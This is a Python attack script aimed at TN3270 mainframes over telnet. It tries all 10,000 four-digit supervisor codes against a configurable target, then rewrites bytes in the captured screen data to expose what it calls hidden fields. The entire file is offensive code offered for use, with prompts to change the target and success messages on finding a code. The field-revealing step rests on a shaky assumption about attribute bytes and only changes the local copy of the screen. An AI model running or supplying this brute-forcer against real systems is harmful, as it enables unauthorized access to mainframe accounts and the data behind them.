import telnetlib3
import asyncio
import struct
import time

# Target Mainframe Server (Change this to your target)
MAINFRAME_IP = "127.0.0.1"
MAINFRAME_PORT = 23  # Default TN3270 port

# Brute force wordlist (4-digit supervisor codes)
wordlist = [f"{i:04d}" for i in range(10000)]  # Generates 0000 to 9999

async def connect_to_mainframe():
    """Establishes a connection to a TN3270 mainframe."""
    reader, writer = await telnetlib3.open_connection(MAINFRAME_IP, MAINFRAME_PORT)
    print("[+] Connected to Mainframe!")

    # Capture initial mainframe screen
    data = await reader.read(1024)
    print("[+] Initial Screen Captured:\n", data)

    return reader, writer

async def brute_force_supervisor_code(reader, writer):
    """Attempts to brute force a 4-digit supervisor code."""
    print("[+] Starting Brute Force Attack on Supervisor Code...")

    for code in wordlist:
        writer.write(code + "\r")  # Send each code attempt
        await asyncio.sleep(0.1)   # Avoid flooding server

        response = await reader.read(256)
        if "Access Granted" in response:  # Adjust based on actual response
            print(f"[!] SUCCESS: Supervisor Code Found → {code}")
            return code
        print(f"[-] Attempt {code} failed...")

    print("[X] Brute force attack failed. No valid code found.")
    return None

async def reveal_hidden_fields(data):
    """Attempts to reveal hidden fields by modifying field attributes."""
    print("[+] Searching for Hidden Fields...")

    modified_data = bytearray(data)
    for i in range(len(modified_data)):
        if modified_data[i] == 0x1D:  # 0x1D is often the 'hidden' field identifier
            modified_data[i] = 0x1F  # Change to 'visible'

    print("[!] Hidden fields modified!")
    return bytes(modified_data)

async def main():
    """Main execution flow."""
    reader, writer = await connect_to_mainframe()

    # Attempt brute-force attack on supervisor code
    valid_code = await brute_force_supervisor_code(reader, writer)

    # Capture mainframe response after attack
    screen_data = await reader.read(1024)

    # Reveal hidden fields
    modified_screen = await reveal_hidden_fields(screen_data)
    print("[+] Modified Screen:\n", modified_screen.decode(errors='ignore'))

    writer.close()
    await writer.wait_closed()

# Run the async script
asyncio.run(main())
